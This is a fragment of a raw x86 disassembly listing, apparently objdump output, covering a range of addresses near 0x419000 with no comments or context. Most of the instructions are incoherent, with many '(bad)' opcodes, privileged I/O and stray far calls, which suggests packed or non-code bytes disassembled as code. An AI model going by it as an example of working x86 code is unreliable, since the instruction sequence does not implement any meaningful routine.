  418fff:	outs   dx,DWORD PTR ds:[esi]
  419000:	mov    esi,ss
  419002:	dec    esi
  419003:	int    0xbc
  419005:	pop    edi
  419006:	mov    dl,0x7e
  419008:	cdq    
  419009:	mov    gs,WORD PTR [edi]
  41900b:	icebp  
  41900c:	dec    edx
  41900d:	xchg   edx,eax
  41900e:	bound  edi,QWORD PTR [ebx]
  419010:	or     ch,bh
  419012:	sar    BYTE PTR [ebx-0x667a75],1
  419018:	mov    ds:0xc831261b,eax
  41901d:	xor    eax,0xa844bb0c
  419022:	enter  0xf4f3,0x4d
  419026:	loop   0x419027
  419028:	dec    esp
  419029:	adc    eax,0xd158d4d
  41902e:	aad    0xa2
  419030:	iret   
  419031:	jb     0x4190a3
  419033:	ret    0xec22
  419036:	mov    DWORD PTR gs:0xc2684723,esp
  41903d:	inc    ebp
  41903e:	loope  0x419090
  419040:	push   esi
  419041:	repz inc edx
  419043:	mov    esi,0xc74c869
  419048:	xchg   ebx,eax
  419049:	pop    ss
  41904a:	out    dx,al
  41904b:	mov    ch,0x76
  41904d:	jno    0x419099
  41904f:	mov    al,ds:0xf4685639
  419054:	jne    0x419049
  419056:	fs gs jns 0x4190a5
  41905a:	fs or  dl,bl
  41905d:	cwde   
  41905e:	jbe    0x419056
  419060:	mov    ecx,0xd4f250fc
  419065:	push   ecx
  419066:	fstp   QWORD PTR [eax-0x11d9ba9c]
  41906c:	arpl   WORD PTR [ebp+0x9897924],di
  419072:	stos   BYTE PTR es:[edi],al
  419073:	test   BYTE PTR [ebx],dl
  419075:	fwait
  419076:	test   BYTE PTR [ecx],cl
  419078:	pushf  
  419079:	xor    al,0xf3
  41907b:	and    DWORD PTR [edx-0x4b],0xf179ac1c
  419082:	ja     0x4190de
  419084:	icebp  
  419085:	jg     0x419017
  419087:	mov    ecx,0xb420103
  41908c:	repz xchg ebx,ecx
  41908f:	adc    DWORD PTR [edi],ebp
  419091:	jno    0x419024
  419093:	enter  0xa2b2,0x68
  419097:	mov    bh,0xf4
  419099:	(bad)  
  41909a:	mov    eax,ds:0x33b770a1
  41909f:	xchg   edx,eax
  4190a0:	xor    esi,DWORD PTR [ebx-0x76]
  4190a3:	call   0xe6dd8885
  4190a8:	or     BYTE PTR [ecx-0x5b],dh
  4190ab:	ficom  DWORD PTR [eax+0x15315f79]
  4190b1:	cwde   
  4190b2:	push   0x52dd491a
  4190b7:	push   eax
  4190b8:	add    dl,BYTE PTR [edx+ebx*2-0x689bcce2]
  4190bf:	lock loop 0x41911c
  4190c2:	push   esp
  4190c3:	mov    WORD PTR [edx+0xf],fs
  4190c6:	and    bh,cl
  4190c8:	arpl   WORD PTR [ebx-0x2c],cx
  4190cb:	dec    esi
  4190cc:	inc    edi
  4190cd:	add    al,bh
  4190cf:	sub    esp,edx
  4190d1:	mov    ecx,DWORD PTR [ebp+0x11]
  4190d4:	sub    BYTE PTR [esi+ecx*4+0x2],ch
  4190d8:	and    ch,BYTE PTR ss:[ecx+0x35]
  4190dc:	add    BYTE PTR [ebx],al
  4190de:	sti    
  4190df:	sbb    eax,0xf3d60af7
  4190e4:	cli    
  4190e5:	ja     0x4190e2
  4190e7:	mov    edi,0x3a35b0ae
  4190ec:	test   eax,0xa980ca1a
  4190f1:	inc    ecx
  4190f2:	jmp    0x4190e3
  4190f4:	rcl    BYTE PTR [eax+ebp*8-0x7d26c793],0x8e
  4190fc:	shl    ebx,0xbc
  4190ff:	into   
  419100:	fdiv   DWORD PTR [edi+0x43]
  419103:	sbb    al,bh
  419105:	lahf   
  419106:	push   esp
  419107:	cmp    DWORD PTR [ebp-0xf804f9a],eax
  41910d:	xor    DWORD PTR [eax-0x3a3de546],0x70f77aa7
  419117:	sbb    eax,esp
  419119:	sub    al,0xe5
  41911b:	mov    edi,0xa33520ab
  419120:	call   0xaf72:0xe79b9f2b
  419127:	lods   eax,DWORD PTR ds:[esi]
  419128:	outs   dx,DWORD PTR ds:[esi]
  419129:	xchg   dl,dh
  41912b:	mul    DWORD PTR [eax+0x393aca47]
  419131:	mov    ebp,0x743285c3
  419136:	aad    0xef
  419138:	test   BYTE PTR [eax],al
  41913a:	push   edi
  41913b:	push   esi
  41913c:	sbb    ebp,ebp
  41913e:	fisub  DWORD PTR [edi+0x21]
  419141:	pop    ebp
  419142:	and    al,0x6b
  419144:	in     eax,0x72
  419146:	fist   WORD PTR [edi+0x6b]
  419149:	sbb    DWORD PTR [eax+ebp*1-0x4a],eax
  41914d:	push   es
  41914e:	jle    0x41917e
  419150:	pop    edx
  419151:	scas   eax,DWORD PTR es:[edi]
  419152:	cli    
  419153:	sbb    BYTE PTR [edx+edi*1+0x3d],ah
  419157:	pop    ecx
  419158:	cmp    al,0x8
  41915a:	rcr    BYTE PTR [esi+0x63],cl
  41915d:	(bad)  
  41915e:	out    dx,al
  41915f:	jae    0x419143
  419161:	push   es
  419162:	mov    ah,0x8f
  419164:	and    DWORD PTR [esi+ecx*2+0x57cae11d],edi
  41916b:	mov    DWORD PTR [ebx+ecx*4],esp
  41916e:	and    ah,BYTE PTR [eax+0x36fd271d]
  419174:	cmc    
  419175:	inc    esi
  419176:	fild   DWORD PTR [bx+si+0x4d]
  41917a:	add    al,0xe7
  41917c:	xor    esp,ebx
  41917e:	xor    DWORD PTR [edx-0x5b8d6bbc],esp
  419184:	(bad)  
  419185:	and    bl,BYTE PTR [ebp-0x22]
  419188:	(bad)  
  419189:	fldcw  WORD PTR [ecx]
  41918b:	xlat   BYTE PTR ds:[ebx]
  41918c:	add    ecx,edi
  41918e:	ss stc 
  419190:	pop    esp
  419191:	jmp    0x4191c1
  419193:	inc    edi
  419194:	jmp    ecx
  419196:	int3   
  419197:	mov    ah,0xe8
  419199:	jo     0x4191e1
  41919b:	ins    DWORD PTR es:[edi],dx
  41919c:	adc    DWORD PTR [edi],edi
  41919e:	mov    ecx,0x5760febb
  4191a3:	push   0xce48d649
  4191a8:	jecxz  0x4191c4
  4191aa:	in     al,dx
  4191ab:	sbb    al,0x5c
  4191ad:	pushf  
  4191ae:	pushf  
  4191af:	pop    eax
  4191b0:	call   0x5a508926
  4191b5:	pusha  
  4191b6:	xchg   ecx,eax
  4191b7:	xor    DWORD PTR [ebx-0x595a3e40],0x5581badd
  4191c1:	dec    ah
  4191c3:	call   0xa2ada79d
  4191c8:	ins    DWORD PTR es:[edi],dx
  4191c9:	(bad)  
  4191cd:	push   ebx
  4191ce:	mov    eax,ds:0xa9844c3a
  4191d3:	push   eax
  4191d4:	aas    
  4191d5:	popa   
  4191d6:	jp     0x4191b8
  4191d8:	add    DWORD PTR [ebp+0x33fcec46],ecx
  4191de:	xchg   ebx,eax
  4191df:	js     0x419212
  4191e1:	fidivr WORD PTR [edi-0x5d8b9b1f]
  4191e7:	mov    ebx,DWORD PTR [ebp+0x73]
  4191ea:	jmp    0x41916e
  4191ec:	shr    esp,cl
  4191ee:	mov    ecx,es
  4191f0:	cmp    BYTE PTR [esi-0x6c],cl
  4191f3:	aad    0xe4
  4191f5:	sub    cl,BYTE PTR [esi+edx*1-0x74]
  4191f9:	shl    DWORD PTR [ecx+0x6f],1
  4191fc:	dec    eax
  4191fd:	pop    es
  4191fe:	ja     0x41921d
  419200:	imul   bh
  419202:	or     BYTE PTR [esi-0x38656076],bh
  419208:	jecxz  0x41918f
  41920a:	inc    esi
  41920b:	scas   al,BYTE PTR es:[edi]
  41920c:	fwait
  41920d:	pop    ss
  41920e:	ror    eax,1
  419210:	out    dx,al
  419211:	xlat   BYTE PTR ds:[ebx]
  419212:	adc    al,0x97
  419214:	mov    ebp,0x25e435ff
  419219:	xor    bh,BYTE PTR [edx+0x52fe2234]
  41921f:	inc    esi
  419220:	pop    ss
  419221:	sub    DWORD PTR [edx-0x54],edx
  419224:	cmc    
  419225:	mov    ebp,eax
  419227:	push   edx
  419228:	add    BYTE PTR [ecx+0x23],dh
  41922b:	test   BYTE PTR [eax+0x5700e35],dl
  419231:	inc    edx
  419232:	adc    ch,BYTE PTR [ebx+0xeb8b102]
  419238:	mov    al,0x30
  41923a:	adc    dl,ch
  41923c:	cwde   
  41923d:	in     eax,dx
  41923e:	lods   eax,DWORD PTR ds:[esi]
  41923f:	push   edi
  419240:	(bad)  
  419241:	jle    0x4191d4
  419243:	out    dx,al
  419244:	cmp    ebx,esp
  419246:	pop    es
  419247:	bound  esp,QWORD PTR [eax]
  419249:	pop    ss
  41924a:	icebp  
  41924b:	nop
  41924c:	sbb    BYTE PTR [ecx],cl
  41924e:	mov    ebx,0xa87a8c52
  419253:	and    DWORD PTR [edx-0x3d442249],esp
  419259:	mov    WORD PTR [ebx+edx*4+0x45],ss
  41925d:	sbb    al,0x4b
  41925f:	push   0x4
  419261:	sub    edi,edx
  419263:	cwde   
  419264:	or     dh,cl
  419266:	retf   0xda2b
  419269:	jmp    0x2f1519e8
  41926e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41926f:	in     al,0xdd
  419271:	lods   al,BYTE PTR ds:[esi]
  419272:	add    al,0xc5
  419274:	stc    
  419275:	pop    ss
  419276:	mov    eax,ds:0x8305fbb5
  41927b:	pop    ebp
  41927c:	pop    esi
  41927d:	pop    esp
  41927e:	int3   
  41927f:	pusha  
  419280:	sub    al,0x25
  419282:	popa   
  419283:	loope  0x419272
  419285:	dec    ebp
  419286:	pop    edx
  419287:	jmp    0x4192a9
  419289:	sbb    eax,0xe65a772f
  41928e:	jb     0x41930d
  419290:	loopne 0x4192d0
  419292:	icebp  
  419293:	popf   
  419294:	or     eax,0x19db57e8
  419299:	xor    al,BYTE PTR [ebx-0x228236c]
  41929f:	mov    ecx,0x95d92735
  4192a4:	dec    esi
  4192a5:	sub    ah,BYTE PTR [eax]
  4192a7:	add    al,0x7e
  4192a9:	into   
  4192aa:	jb     0x419234
  4192ac:	inc    ebp
  4192ad:	sbb    al,BYTE PTR [eax]
  4192af:	mov    ds:0xbc56f139,al
  4192b4:	add    esp,DWORD PTR [ebp-0x368e420d]
  4192ba:	(bad)  
  4192bb:	push   ebx
  4192bc:	daa    
  4192bd:	mov    DWORD PTR [edi+0x7b],eax
  4192c0:	push   esp
  4192c1:	popa   
  4192c2:	sbb    BYTE PTR [ecx],ch
  4192c4:	bound  ebx,QWORD PTR [esi-0x22]
  4192c7:	lock inc edx
  4192c9:	ret    
  4192ca:	sti    
  4192cb:	inc    edi
  4192cc:	cmp    al,0x9d
  4192ce:	das    
  4192cf:	push   ecx
  4192d0:	push   edx
  4192d1:	clc    
  4192d2:	mov    ebp,0x263080a8
  4192d7:	je     0x4192a8
  4192d9:	sub    DWORD PTR [esi-0x6da3be2a],0xddd03888
  4192e3:	mov    eax,0xb7c2c3c2
  4192e8:	fbld   TBYTE PTR [ebx]
  4192ea:	mov    esp,DWORD PTR [ecx-0x3]
  4192ed:	cs aaa 
  4192ef:	cmp    DWORD PTR [eax+0x59],edx
  4192f2:	push   esi
  4192f3:	or     eax,0xaf9a6c37
  4192f8:	call   0x90b853ff
  4192fd:	sbb    eax,0xc79c87df
  419302:	and    BYTE PTR [ebx+ebp*4+0x7c],bh
  419306:	jae    0x4192c0
  419308:	outs   dx,BYTE PTR cs:[esi]
  41930a:	nop
  41930b:	pop    eax
  41930c:	fst    QWORD PTR ds:0x79caffa0
  419312:	gs mov eax,0xff25735
  419318:	cdq    
  419319:	out    dx,al
  41931a:	inc    eax
  41931b:	sar    BYTE PTR [ebx-0x18ec179c],1
  419321:	add    DWORD PTR ds:0xf15ab74,edx
  419327:	lods   eax,DWORD PTR ds:[esi]
  419328:	xor    ebp,edi
  41932a:	jno    0x41936a
  41932c:	or     ecx,ebp
  41932e:	jb     0x4192b3
  419330:	sti    
  419331:	cmp    ah,BYTE PTR [ebx-0x64]
  419334:	inc    ebp
  419335:	xor    ch,BYTE PTR [ecx-0x15]
  419338:	jg     0x41930d
  41933a:	call   0x1d88:0xabc19c2
  419341:	inc    esi
  419342:	mov    bh,0x98
  419344:	ins    DWORD PTR es:[edi],dx
  419345:	lahf   
  419346:	pusha  
  419347:	pop    ss
  419348:	std    
  419349:	adc    ecx,DWORD PTR [ebp-0x2c6d7217]
  41934f:	dec    ecx
  419350:	mov    ch,0xc6
  419352:	adc    al,0xf1
  419354:	push   es
  419355:	xor    al,0x7f
  419357:	xchg   edi,eax
  419358:	add    al,0x20
  41935a:	rcr    bl,cl
  41935c:	fdivr  st(2),st
  41935e:	sbb    DWORD PTR [eax],edi
  419360:	popa   
  419361:	xchg   esp,eax
  419362:	jo     0x419357
  419364:	mov    bl,0x2e
  419366:	xor    al,0xce
  419368:	out    0xf1,eax
  41936a:	mov    edi,0x83084c7
  41936f:	jo     0x4192f7
  419371:	sahf   
  419372:	jp     0x4193aa
  419374:	clc    
  419375:	jge    0x419313
  419377:	int3   
  419378:	adc    si,WORD PTR [edi-0x19b6cbc7]
  41937f:	dec    edx
  419380:	mov    ds:0xe90a2a4c,eax
  419385:	ins    BYTE PTR es:[edi],dx
  419386:	ss int 0x89
  419389:	outs   dx,DWORD PTR ds:[esi]
  41938a:	inc    eax
  41938b:	xchg   esi,eax
  41938c:	xchg   DWORD PTR [esi+eiz*4+0x2b58ebb1],edx
  419393:	(bad)  
  419394:	repz inc ebx
  419396:	loop   0x4193a3
  419398:	repz xchg ecx,eax
  41939a:	cmp    al,0x92
  41939c:	dec    ebp
  41939d:	and    ebp,DWORD PTR [edi+edi*8+0x79]
  4193a1:	mov    ah,0xc6
  4193a3:	jecxz  0x419379
  4193a5:	repz and eax,0x9ad158d9
  4193ab:	mov    ah,0x75
  4193ad:	scas   eax,DWORD PTR es:[edi]
  4193ae:	inc    ebx
  4193af:	je     0x419409
  4193b1:	dec    edx
  4193b2:	into   
  4193b3:	lea    ecx,[eax+0x6d]
  4193b6:	fbld   TBYTE PTR [ebx+0x6f]
  4193b9:	jo     0x419353
  4193bb:	aaa    
  4193bc:	lods   eax,DWORD PTR ds:[esi]
  4193bd:	aad    0x58
  4193bf:	test   ch,ch
  4193c1:	push   cs
  4193c2:	jae    0x419438
  4193c4:	sbb    esp,edx
  4193c6:	in     eax,0x88
  4193c8:	or     cl,BYTE PTR [ecx]
  4193ca:	adc    al,BYTE PTR [edx-0x26]
  4193cd:	stc    
  4193ce:	(bad)  
  4193cf:	cld    
  4193d0:	out    dx,al
  4193d1:	inc    ecx
  4193d2:	and    eax,0x3ce2a470
  4193d7:	or     eax,0x133e6b9e
  4193dc:	es clc 
  4193de:	aad    0xa4
  4193e0:	push   0x16c7461b
  4193e5:	out    dx,al
  4193e6:	push   es
  4193e7:	ins    BYTE PTR es:[edi],dx
  4193e8:	loop   0x419427
  4193ea:	dec    esi
  4193eb:	push   edi
  4193ec:	mov    edx,0x9fc10a5e
  4193f1:	and    BYTE PTR [ebx+0x3b],ah
  4193f4:	dec    ebx
  4193f5:	dec    eax
  4193f6:	mov    bl,0xa3
  4193f8:	sub    eax,0xf0111a2c
  4193fd:	les    edi,FWORD PTR fs:[bp+di]
  419401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419402:	mov    eax,DWORD PTR ss:[edi-0x62]
  419406:	jmp    0xb9bd:0x405f61c6
  41940d:	(bad)  
  41940e:	daa    
  41940f:	mov    ebp,0xe5cce6c2
  419414:	int    0x5
  419416:	jne    0x41945a
  419418:	push   ss
  419419:	sar    BYTE PTR [esi-0x10dd93b1],0x14
  419420:	adc    DWORD PTR [ecx],eax
  419422:	das    
  419423:	ins    BYTE PTR es:[edi],dx
  419424:	addr16 pop ss
  419426:	fcomp  QWORD PTR [esi]
  419428:	repnz iret 
  41942a:	xor    ah,BYTE PTR [edi]
  41942c:	mov    DWORD PTR [eax+0x43],esi
  41942f:	sbb    esp,DWORD PTR [ecx]
  419431:	ins    DWORD PTR es:[edi],dx
  419432:	jns    0x4193c5
  419434:	xor    eax,0xfe3a3f23
  419439:	adc    bl,BYTE PTR [ebp-0x3e]
  41943c:	jg     0x41940a
  41943e:	pop    esi
  41943f:	test   BYTE PTR [edx-0x29],0x98
  419443:	push   cs
  419444:	mov    edx,0x49d824c2
  419449:	or     ebx,DWORD PTR [esi+edx*1+0x1184d134]
  419450:	pop    esi
  419451:	add    al,0x67
  419453:	aaa    
  419454:	mov    ds:0x7dfa6cc2,al
  419459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41945a:	cdq    
  41945b:	inc    eax
  41945c:	iret   
  41945d:	cmp    cl,dl
  41945f:	aam    0x62
  419461:	test   BYTE PTR [ebp+0x51],ch
  419464:	aaa    
  419465:	mov    eax,ds:0xc1fa5d9a
  41946a:	out    0xde,eax
  41946c:	mov    BYTE PTR [eax+0x26a1cb93],0xd9
  419473:	sub    ebp,esi
  419475:	jle    0x41942e
  419477:	outs   dx,BYTE PTR ds:[esi]
  419478:	jge    0x4194e9
  41947a:	sti    
  41947b:	repnz loop 0x4194b8
  41947e:	xor    al,0x51
  419480:	lods   eax,DWORD PTR ds:[esi]
  419481:	jge    0x419405
  419483:	adc    DWORD PTR [ebp+0x70e97f70],edi
  419489:	fnstsw WORD PTR [ebx-0x70]
  41948c:	pop    ecx
  41948d:	shl    DWORD PTR [edi],1
  41948f:	rol    ch,cl
  419491:	mov    dl,0xce
  419493:	shr    DWORD PTR [esi],0xb5
  419496:	js     0x41947f
  419498:	or     BYTE PTR [edi-0x4],al
  41949b:	in     al,0xb7
  41949d:	loop   0x4194d1
  41949f:	jle    0x4194b2
  4194a1:	fidiv  DWORD PTR [eax-0x7ac18948]
  4194a7:	inc    esi
  4194a8:	add    eax,0xfe4939ab
  4194ad:	nop
  4194ae:	pop    edi
  4194af:	es fwait
  4194b1:	or     BYTE PTR [eax],ch
  4194b3:	xchg   ebp,eax
  4194b4:	sbb    edi,esi
  4194b6:	and    ebp,DWORD PTR [ebx]
  4194b8:	push   ss
  4194b9:	mov    ecx,0x390ce419
  4194be:	push   esi
  4194bf:	std    
  4194c0:	dec    edx
  4194c1:	jo     0x4194a5
  4194c3:	arpl   cx,di
  4194c5:	les    esi,FWORD PTR [esi]
  4194c7:	mov    al,ds:0x3df4e6fe
  4194cc:	cs mov ebp,0xd98cc5f8
  4194d2:	pop    ds
  4194d3:	mov    ecx,0x893863b8
  4194d8:	pop    ebp
  4194d9:	rcr    DWORD PTR [eax],cl
  4194db:	push   0xffffffbc
  4194dd:	mov    bl,0x98
  4194df:	mov    ah,BYTE PTR [edx+0x6f312ffb]
  4194e5:	fwait
  4194e6:	ret    0x5d12
  4194e9:	and    esi,DWORD PTR [ecx-0x56]
  4194ec:	push   0x5a
  4194ee:	lock and DWORD PTR [edx+edx*1+0xe],edx
  4194f3:	outs   dx,DWORD PTR ds:[esi]
  4194f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f5:	cmp    al,0x17
  4194f7:	sbb    DWORD PTR [eax],esi
  4194f9:	jl     0x4194be
  4194fb:	jmp    0x419568
  4194fd:	cmc    
  4194fe:	ins    BYTE PTR es:[edi],dx
  4194ff:	mov    esi,0x894c0460
  419504:	jmp    0x419570
  419506:	cs (bad) 
  419508:	popf   
  419509:	mov    eax,0xbf6df614
  41950e:	dec    eax
  41950f:	push   ds
  419510:	rol    BYTE PTR [ebx+edx*4-0x1b],cl
  419514:	cmp    eax,0x703e4ac
  419519:	add    eax,esi
  41951b:	xor    bl,cl
  41951d:	xor    DWORD PTR [ecx-0x42],ebp
  419520:	call   0x79b7d8ff
  419525:	inc    esi
  419526:	rcr    DWORD PTR [esi],1
  419528:	popa   
  419529:	xchg   edi,eax
  41952a:	push   edi
  41952b:	retf   0xf2f4
  41952e:	jecxz  0x4194d3
  419530:	xchg   esp,eax
  419531:	push   es
  419532:	fidivr DWORD PTR [edx]
  419534:	mov    ecx,0xf0996dc6
  419539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41953a:	call   0xd8b5:0xe1365eb7
  419541:	and    eax,0x74e5fbf8
  419546:	cmc    
  419547:	xchg   ebp,eax
  419548:	xor    eax,0x8fb88257
  41954d:	adc    DWORD PTR [edx-0x53f43b26],ebx
  419553:	inc    edx
  419554:	xchg   ecx,eax
  419555:	and    bl,BYTE PTR [esp+esi*1-0x600070b1]
  41955c:	int    0x42
  41955e:	push   edi
  41955f:	rcr    DWORD PTR [ecx],cl
  419561:	test   DWORD PTR [ebp+0x158a7943],edi
  419567:	push   cs
  419568:	mov    ds:0x4b7a4981,al
  41956d:	cmc    
  41956e:	cmp    BYTE PTR [esp+edx*1-0x3ebfa676],cl
  419575:	scas   al,BYTE PTR es:[edi]
  419576:	popa   
  419577:	push   ecx
  419578:	je     0x419583
  41957a:	xchg   ebp,eax
  41957b:	adc    al,al
  41957d:	icebp  
  41957e:	cmp    DWORD PTR [edx+0x6a733c49],0x91acd2d1
  419588:	adc    bh,cl
  41958a:	ror    edi,1
  41958c:	(bad)  
  41958d:	enter  0x594d,0x8c
  419591:	(bad)  
  419592:	out    dx,eax
  419593:	call   0x8ed7:0x47050fb4
  41959a:	loope  0x4195f3
  41959c:	aam    0x66
  41959e:	adc    eax,0x6f758d69
  4195a3:	push   ss
  4195a4:	dec    ebx
  4195a5:	cmc    
  4195a6:	(bad)  
  4195a7:	loopne 0x4195db
  4195a9:	dec    ebp
  4195aa:	(bad)  
  4195ab:	dec    ebp
  4195ac:	jbe    0x419556
  4195ae:	jo     0x41961e
  4195b0:	and    eax,0xa2266887
  4195b5:	aam    0x48
  4195b7:	ins    DWORD PTR es:[edi],dx
  4195b8:	dec    esi
  4195b9:	arpl   WORD PTR [ecx-0x46],sp
  4195bc:	cmp    dl,dl
  4195be:	push   ecx
  4195bf:	sbb    al,0x2e
  4195c1:	push   cs
  4195c2:	cwde   
  4195c3:	jl     0x41959c
  4195c5:	rcr    BYTE PTR [esi+0x50636b40],0x22
  4195cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195cd:	mov    bh,0x6f
  4195cf:	test   DWORD PTR [eax],edx
  4195d1:	xlat   BYTE PTR ds:[ebx]
  4195d2:	cwde   
  4195d3:	popa   
  4195d4:	in     al,dx
  4195d5:	mov    DWORD PTR [eax+0x1580ad73],ebx
  4195db:	mov    al,ds:0xa1447f61
  4195e0:	cmp    esi,DWORD PTR [edx-0x4c]
  4195e3:	adc    al,BYTE PTR [ebx-0x445a42c6]
  4195e9:	or     eax,0x5b290b80
  4195ee:	or     DWORD PTR [ecx],esp
  4195f0:	pop    edx
  4195f1:	push   ds
  4195f2:	call   0x5d0d:0xee6b62d3
  4195f9:	(bad)  
  4195fa:	pop    es
  4195fb:	(bad)  [eax+0x72]
  4195fe:	pop    eax
  4195ff:	rcr    DWORD PTR [eax],0x13
  419602:	add    cl,0x92
  419605:	pop    edx
  419606:	shl    BYTE PTR [eax],1
  419608:	ins    DWORD PTR es:[edi],dx
  419609:	jge    0x4195d6
  41960b:	aad    0xf9
  41960d:	or     al,0xc2
  41960f:	or     bl,bh
  419611:	mov    esp,?
  419613:	mov    BYTE PTR [ebx+0x3d04739a],bh
  419619:	inc    edx
  41961a:	lds    ebp,FWORD PTR [esi+0x42]
  41961d:	ret    
  41961e:	loop   0x41968d
  419620:	push   edx
  419621:	enter  0x26d4,0x3d
  419625:	jne    0x41965a
  419627:	rcl    DWORD PTR [edi],1
  419629:	push   ds
  41962a:	rsm    
  41962c:	push   ebp
  41962d:	es enter 0xc412,0x3d
  419632:	ins    BYTE PTR es:[edi],dx
  419633:	retf   0x3424
  419636:	repnz mov BYTE PTR [ebx],ah
  419639:	(bad)  
  41963a:	scas   eax,DWORD PTR es:[edi]
  41963b:	add    al,BYTE PTR [eax-0x489cfcb8]
  419641:	popa   
  419642:	scas   eax,DWORD PTR es:[edi]
  419643:	loope  0x4195ed
  419645:	repz push cs
  419647:	jecxz  0x419654
  419649:	ins    DWORD PTR es:[edi],dx
  41964a:	ficom  DWORD PTR [ecx+0xe]
  41964d:	sbb    eax,0x62130f04
  419652:	ins    BYTE PTR es:[edi],dx
  419653:	clc    
  419654:	dec    ebx
  419655:	mov    edx,0xb061c199
  41965a:	test   eax,0x3fdf38e8
  41965f:	dec    edx
  419660:	pop    edi
  419661:	arpl   WORD PTR [ebp+0x2a714ae8],cx
  419667:	mov    dh,0x34
  419669:	clc    
  41966a:	ds dec edx
  41966c:	mov    esi,0x87e1c9c6
  419671:	sar    BYTE PTR [esi-0x78],0x20
  419675:	or     bh,bl
  419677:	cmp    DWORD PTR [eax-0x24f70ce],esi
  41967d:	push   cs
  41967e:	outs   dx,DWORD PTR ds:[esi]
  41967f:	xor    ebx,DWORD PTR [edx-0x4f6e3d4]
  419685:	dec    ecx
  419686:	xchg   esi,eax
  419687:	or     al,BYTE PTR [esi+0x23]
  41968a:	cdq    
  41968b:	dec    esi
  41968c:	mov    esi,0x7cf3063e
  419691:	adc    eax,0x3b4a5551
  419696:	or     BYTE PTR [esp+ebp*1],bh
  419699:	mov    DWORD PTR [eax-0x719bdd85],esp
  41969f:	ins    BYTE PTR es:[edi],dx
  4196a0:	jns    0x419645
  4196a2:	js     0x419640
  4196a4:	jmp    0x4196e0
  4196a6:	call   0x65c7:0xd13a5f4e
  4196ad:	out    0xfd,al
  4196af:	(bad)  
  4196b0:	out    dx,al
  4196b1:	mov    edx,ebx
  4196b3:	hlt    
  4196b4:	popf   
  4196b5:	(bad)  
  4196b6:	bswap  esi
  4196b8:	jecxz  0x41969e
  4196ba:	clc    
  4196bb:	mov    ebx,0x85f22052
  4196c0:	je     0x419719
  4196c2:	int    0x4a
  4196c4:	and    al,0xfc
  4196c6:	dec    ebp
  4196c7:	sbb    eax,0x288986e8
  4196cc:	mov    ds:0xb99a42e0,eax
  4196d1:	(bad)  
  4196d2:	mov    esp,DWORD PTR [ebx-0x5f]
  4196d5:	push   edi
  4196d6:	retf   0xe346
  4196d9:	xor    ebx,DWORD PTR [ebx-0x17]
  4196dc:	jmp    0xef40:0xc079f0b1
  4196e3:	cs push 0xa8f584ab
  4196e9:	dec    esi
  4196ea:	push   edi
  4196eb:	ss add eax,0x81c8ea3
  4196f1:	test   esi,edi
  4196f3:	dec    edi
  4196f4:	pop    es
  4196f5:	pop    ecx
  4196f6:	pop    ebp
  4196f7:	inc    edi
  4196f8:	in     eax,0xac
  4196fa:	retf   0xdbf3
  4196fd:	jne    0x41976b
  4196ff:	retf   0xc5e8
  419702:	loopne 0x4196f1
  419704:	lea    ebx,[esi+0x3f431269]
  41970a:	push   ds
  41970b:	or     BYTE PTR [edi],bh
  41970d:	adc    bl,BYTE PTR [eax+edx*4]
  419710:	xor    ebx,DWORD PTR [edi]
  419712:	aam    0x67
  419714:	sbb    eax,0x3e2c07e
  419719:	ror    ebx,cl
  41971b:	hlt    
  41971c:	mov    edi,0xc7b80ee6
  419721:	add    dh,dl
  419723:	add    al,0xc
  419725:	mov    ebx,0xd5947a3a
  41972a:	cmp    eax,0xb64c6418
  41972f:	add    ch,BYTE PTR [ebx]
  419731:	jg     0x4196c7
  419733:	xor    DWORD PTR [eax-0x24],ebp
  419736:	(bad)  
  419737:	rol    dl,0x2f
  41973a:	adc    cl,BYTE PTR [edi+edi*2]
  41973d:	xchg   ebp,eax
  41973e:	ds dec ebx
  419740:	gs add al,0x79
  419743:	imul   esp,DWORD PTR [edi-0x60067775],0x28
  41974a:	(bad)  
  41974b:	out    dx,eax
  41974c:	pop    eax
  41974d:	jbe    0x4196e0
  41974f:	test   al,0x4a
  419751:	rcr    DWORD PTR [edi-0x71062f5a],cl
  419757:	mov    bl,0x5b
  419759:	jns    0x419778
  41975b:	jl     0x4197aa
  41975d:	xchg   bl,al
  41975f:	add    BYTE PTR [ebx+0x58],ch
  419762:	jne    0x41978f
  419764:	mov    dl,BYTE PTR [eax]
  419766:	and    BYTE PTR [ebx-0x5ab6d548],bh
  41976c:	or     al,0xdb
  41976e:	push   ds
  41976f:	cmp    dl,ah
  419771:	fwait
  419772:	cmp    ch,BYTE PTR [ecx+0x15]
  419775:	out    0x95,al
  419777:	jo     0x4197cf
  419779:	fcom   st(6)
  41977b:	adc    al,0xcd
  41977d:	dec    ecx
  41977e:	or     BYTE PTR [eax+0x690117e4],bl
  419784:	repz dec edi
  419786:	lods   eax,DWORD PTR ds:[esi]
  419787:	push   ebp
  419788:	ror    DWORD PTR ds:0x9cf36500,0xcd
  41978f:	fisubr DWORD PTR [edi]
  419791:	ret    0x5ebc
  419794:	(bad)  
  419795:	loopne 0x4197f4
  419797:	and    dl,BYTE PTR [esi+edi*1-0x5f2e0747]
  41979e:	fucomi st,st(5)
  4197a0:	mov    esi,0xf260129a
  4197a5:	pop    esi
  4197a6:	adc    DWORD PTR [esi],0xda8010aa
  4197ac:	or     BYTE PTR es:[ebx],al
  4197af:	jle    0x4197bd
  4197b1:	test   al,0x62
  4197b3:	push   0xbdb84d9b
  4197b8:	cmc    
  4197b9:	sbb    ah,BYTE PTR [ebx-0xa]
  4197bc:	inc    eax
  4197bd:	push   es
  4197be:	sub    DWORD PTR [eax+0x1f],ecx
  4197c1:	adc    eax,0x636cf181
  4197c6:	ins    DWORD PTR es:[edi],dx
  4197c7:	push   cs
  4197c8:	add    BYTE PTR [edi-0x56],al
  4197cb:	and    cl,cl
  4197cd:	jge    0x4197c4
  4197cf:	test   al,0x80
  4197d1:	out    0x74,al
  4197d3:	adc    DWORD PTR [ecx+ecx*2-0x393d2ff5],ebx
  4197da:	push   cs
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0x80
  4197de:	pop    eax
  4197df:	cmp    bh,bl
  4197e1:	(bad)  
  4197e2:	iret   
  4197e3:	cdq    
  4197e4:	outs   dx,BYTE PTR ds:[esi]
  4197e5:	in     eax,dx
  4197e6:	rol    dl,1
  4197e8:	(bad)  
